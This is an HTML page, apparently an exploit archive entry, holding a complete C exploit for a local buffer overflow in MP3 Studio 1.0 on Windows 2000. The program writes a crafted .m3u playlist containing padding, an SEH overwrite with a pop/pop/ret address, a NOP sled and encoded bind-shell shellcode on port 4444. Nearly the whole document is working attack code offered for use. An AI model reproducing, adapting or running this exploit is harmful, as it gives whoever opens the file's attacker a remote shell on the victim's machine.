<html><head><title>MP3 Studio 1.0 (.m3u File) Local Buffer Overflow Exploit</title></head><pre>/* mplode.c vs MP3 Studio v1.0
 * Tested on: Windows 2000 SP4
 *
 * Author: Dominic Chell &lt;dmc@deadbeef.co.uk&gt;
 *
 * PoC: http://www.milw0rm.com/exploits/9277
 * The PoC author said he could not exploit it so I decided to try.
 *
 * A bit of fun for a boring night in Peterborough :(
 * Good luck finding someone who uses this media player.
 */

#include &quot;stdafx.h&quot;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;

#define usage(){ (void)fprintf(stderr, &quot;MPlode vs MP3 Studio v1.0\n(C) dmc &lt;dmc@deadbeef.co.uk&gt;\n\nExample: mplode.exe [output file]\n&quot;);}
#define error(e){ (void)fprintf(stderr,&quot;%s\n&quot;,e); return -1;}

// bind shell lport = 4444
char shellcode[] =
	&quot;\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7&quot;
	&quot;\x82\xf8\x80\x83\xeb\xfc\xe2\xf4\x0b\xe8\x13\xcd\x1f\x7b\x07\x7f&quot;
	&quot;\x08\xe2\x73\xec\xd3\xa6\x73\xc5\xcb\x09\x84\x85\x8f\x83\x17\x0b&quot;
	&quot;\xb8\x9a\x73\xdf\xd7\x83\x13\xc9\x7c\xb6\x73\x81\x19\xb3\x38\x19&quot;
	&quot;\x5b\x06\x38\xf4\xf0\x43\x32\x8d\xf6\x40\x13\x74\xcc\xd6\xdc\xa8&quot;
	&quot;\x82\x67\x73\xdf\xd3\x83\x13\xe6\x7c\x8e\xb3\x0b\xa8\x9e\xf9\x6b&quot;
	&quot;\xf4\xae\x73\x09\x9b\xa6\xe4\xe1\x34\xb3\x23\xe4\x7c\xc1\xc8\x0b&quot;
	&quot;\xb7\x8e\x73\xf0\xeb\x2f\x73\xc0\xff\xdc\x90\x0e\xb9\x8c\x14\xd0&quot;
	&quot;\x08\x54\x9e\xd3\x91\xea\xcb\xb2\x9f\xf5\x8b\xb2\xa8\xd6\x07\x50&quot;
	&quot;\x9f\x49\x15\x7c\xcc\xd2\x07\x56\xa8\x0b\x1d\xe6\x76\x6f\xf0\x82&quot;
	&quot;\xa2\xe8\xfa\x7f\x27\xea\x21\x89\x02\x2f\xaf\x7f\x21\xd1\xab\xd3&quot;
	&quot;\xa4\xd1\xbb\xd3\xb4\xd1\x07\x50\x91\xea\xe9\xdc\x91\xd1\x71\x61&quot;
	&quot;\x62\xea\x5c\x9a\x87\x45\xaf\x7f\x21\xe8\xe8\xd1\xa2\x7d\x28\xe8&quot;
	&quot;\x53\x2f\xd6\x69\xa0\x7d\x2e\xd3\xa2\x7d\x28\xe8\x12\xcb\x7e\xc9&quot;
	&quot;\xa0\x7d\x2e\xd0\xa3\xd6\xad\x7f\x27\x11\x90\x67\x8e\x44\x81\xd7&quot;
	&quot;\x08\x54\xad\x7f\x27\xe4\x92\xe4\x91\xea\x9b\xed\x7e\x67\x92\xd0&quot;
	&quot;\xae\xab\x34\x09\x10\xe8\xbc\x09\x15\xb3\x38\x73\x5d\x7c\xba\xad&quot;
	&quot;\x09\xc0\xd4\x13\x7a\xf8\xc0\x2b\x5c\x29\x90\xf2\x09\x31\xee\x7f&quot;
	&quot;\x82\xc6\x07\x56\xac\xd5\xaa\xd1\xa6\xd3\x92\x81\xa6\xd3\xad\xd1&quot;
	&quot;\x08\x52\x90\x2d\x2e\x87\x36\xd3\x08\x54\x92\x7f\x08\xb5\x07\x50&quot;
	&quot;\x7c\xd5\x04\x03\x33\xe6\x07\x56\xa5\x7d\x28\xe8\x07\x08\xfc\xdf&quot;
	&quot;\xa4\x7d\x2e\x7f\x27\x82\xf8\x80&quot;;

char *seh = &quot;\xC4\x2A\x02\x75&quot;;
//ws2help.dll - 0x75022AC4 - pop/pop/ret
char *nextseh = &quot;\xeb\x10\x90\x90&quot;;
// short jmp nop nop

int main(int argc, char *argv[])
{
	char outfile[20];
	if(argc &lt; 2)
	{
		usage();
		return 0;
	}

	if(strlen(argv[1])&lt;15)
	{
		strncpy(outfile, argv[1], 14);
		outfile[14] = '\0';
	}
	else strcpy(outfile, &quot;mplode.m3u&quot;);

	FILE *fp = fopen(outfile, &quot;w&quot;);
	if (!fp) error(&quot;[*] Cannot output file\n&quot;);

	fwrite(&quot;http://&quot;, 7, 1, fp);
	for (int i=0; i&lt;4103; i++)
	{
		fwrite(&quot;\x41&quot;, 1, 1, fp);
	}
	
	fwrite(nextseh, 4, 1, fp);
	fwrite(seh, 4, 1, fp);
	
	for (int i=0; i&lt;500; i++)
	{
		fwrite(&quot;\x90&quot;, 1, 1, fp);
	}
	
	fwrite(shellcode, sizeof(shellcode), 1, fp);

	fclose(fp);

	fprintf(stderr, &quot;MPlode vs MP3 Studio v1.0\n(C) dmc &lt;dmc@deadbeef.co.uk&gt;\n\n&quot;, outfile);
	fprintf(stderr, &quot;[*] Success, exploit written to %s\n&quot;, outfile);

	exit(0);

	return 0;
}

// milw0rm.com [2009-09-14]</pre></html>